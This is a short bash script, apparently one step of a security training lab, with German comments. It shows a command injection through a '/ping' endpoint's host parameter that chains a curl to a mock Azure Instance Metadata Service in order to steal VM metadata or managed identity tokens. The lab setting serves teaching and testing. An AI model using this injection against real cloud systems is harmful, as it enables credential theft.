#!/usr/bin/env bash
# ==============================================================================
# 16. CLOUD INSTANCE METADATA SERVICE (IMDS) EXFILTRIEREN
# ==============================================================================
# In Cloud-Umgebungen (z. B. Azure AKS) können Pods ohne Netzwerkrestriktionen
# den Link-Local Metadata Service (169.254.169.254) abfragen, um VM-Metadaten
# oder Entra ID Managed Identity Tokens zu stehlen.
#
# In diesem Labor emuliert der Service "mock-azure-imds" die Azure IMDS API.
# Über die Command Injection senden wir eine HTTP-Anfrage mit dem erforderlichen
# Header "Metadata: true" an diesen Dienst.
#
# Erklärung der Parameter:
# -s                    : Silent-Modus
# -H "Metadata:true"    : Authentifizierungs-/Sicherheits-Header für Azure IMDS
# api-version=2021-02-01: Azure REST API Version

curl -s -G "http://localhost:5000/ping" --data-urlencode \
  'host=127.0.0.1; curl -s -H "Metadata:true" "http://mock-azure-imds/metadata/instance?api-version=2021-02-01"'
echo ""
